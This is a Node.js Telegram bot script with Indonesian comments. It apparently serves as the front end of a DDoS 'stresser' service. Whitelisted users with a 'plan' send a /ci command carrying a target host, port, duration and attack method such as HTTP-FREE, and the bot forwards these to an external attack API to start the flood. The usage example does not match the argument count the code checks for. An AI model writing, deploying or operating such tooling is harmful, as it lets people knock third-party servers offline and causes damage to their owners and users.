const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// Ganti dengan token bot Anda
const bot = new TelegramBot('token bot telegram', {polling: true});

// Menampilkan informasi penggunaan untuk /ci saja
const usageMessage = 'Gunakan /ci host port time method untuk menjalankan perintah tertentu. Contoh: /ci https://example.com 60 HTTP-FREE GET';

// Objek untuk menyimpan plan yang diizinkan
const allowedPlans = {
  '@perkicau': 'ok',
  '@perkicau': 'ok',
  '@perkicau': 'ok',

  // Tambahkan username dan plan sesuai kebutuhan
};

bot.onText(/\/ci (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const username = `@${msg.from.username}`;  // Mendapatkan username pengguna yang menjalankan perintah
  const commandArguments = match[1].split(' ');

  // Cek apakah jumlah argumen sesuai
  if (commandArguments.length !== 4) {
    bot.sendMessage(chatId, usageMessage);
    return;
  }

  // Cek apakah pengguna memiliki plan yang benar
  const userPlan = allowedPlans[username];
  if (!userPlan) {
    bot.sendMessage(chatId, 'Anda tidak memiliki izin untuk menggunakan perintah ini. Harap hubungi @perkicau untuk mendapatkan izin.');
    return;
  }

  const host = commandArguments[0];
  const port = commandArguments[1];
  const time = commandArguments[2];
  const method = commandArguments[3];

  const apiUrl = `https://api.ok.cat/start?api_key=ok&user=ok&target=${host}:${port}&time=${time}&method=${method}&requestmethod=${method}`;

  // Log ke console username pengguna yang menjalankan perintah
  console.log(`Command /ci executed by user ${username} with plan ${userPlan} in chat ${chatId}`);

  // Kirim permintaan ke API
  axios.get(apiUrl)
    .then(response => {
      // Kirim pesan ke pengguna setelah permintaan berhasil
      const successMessage = `Success!\nHost: ${host}:${port}\nTime: ${time}s\nMethod: ${method}\nRequest Method: ${method}`;
      bot.sendMessage(chatId, successMessage);
    })
    .catch(error => {
      // Tangani kesalahan jika ada
      console.error('Error:', error);
      bot.sendMessage(chatId, 'Error occurred while processing the request.');
    });
});

// Menambahkan tanggapan untuk perintah bantuan /help
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, usageMessage);
});
